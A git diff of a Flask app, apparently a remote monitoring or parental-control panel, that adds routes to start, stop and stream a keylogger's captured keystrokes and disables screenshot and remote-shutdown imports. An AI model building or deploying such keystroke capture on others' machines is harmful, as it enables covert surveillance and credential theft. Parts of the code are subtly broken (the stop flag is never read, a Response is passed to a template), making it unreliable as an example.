@@ -1,15 +1,15 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, Response
 import sqlite3
 import os
 import threading
-from server.parent import keyLogger_data
 from server.parent import keyLogger
-from server.receiveImageScreen import screenshots as parent_screenshots
-from server.remoteControl import shutdown_computer, restart_computer
+# from server.receiveImageScreen import screenshots as parent_screenshots
+# from server.remoteControl import shutdown_computer, restart_computer
 
 
 app = Flask(__name__) 
-
+stop_flag = False  # Cờ để kiểm soát việc dừng chương trình
+keylogger_thread = None  # Luồng chạy keylogger
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -43,29 +43,38 @@ def login():
 
     return render_template('login.html')
 
-# Route để trả về chuỗi dạng plain text
-@app.route('/plain_text_data')
-def get_plain_text_data():
-    print(keyLogger_data)
-    return keyLogger_data
 
 @app.route('/keylogger')
 def keyLogger_route():
-    thread = threading.Thread(target=keyLogger()) 
-    thread.daemon = True
-    thread.start() 
-    # global dataTest
-    # dataTest = parent_keylogger()
-    # return render_template('keylogger.html', dataTest=dataTest)  
-   
-    return render_template('keylogger.html')
+    def generate():
+        for data in keyLogger():
+            yield data
 
+    dataReponse = Response(generate(), content_type='text/plain')
+    return render_template('keylogger.html', dataResponse=dataReponse)
+
+# Route để bắt đầu keylogger
+@app.route('/start_keylogger')
+def start_keylogger():
+    global keylogger_thread
+    keylogger_thread = threading.Thread(target=keyLogger)
+    keylogger_thread.start()
+    return "Keylogger started!"
+
+# Route để dừng keylogger
+@app.route('/stop_keylogger')
+def stop_keylogger():
+    global stop_flag
+    global keylogger_thread
+    stop_flag = True
+    if keylogger_thread:
+        keylogger_thread.join()
+    return "Keylogger stopped!"
 
 @app.route('/screenshots')
 def screenshots_route():
-    global dataTest
-    dataTest = parent_screenshots()
-    return render_template('screenshots.html', dataTest=dataTest)
+
+    return render_template('screenshots.html')
 
 
 @app.route('/remote-control')
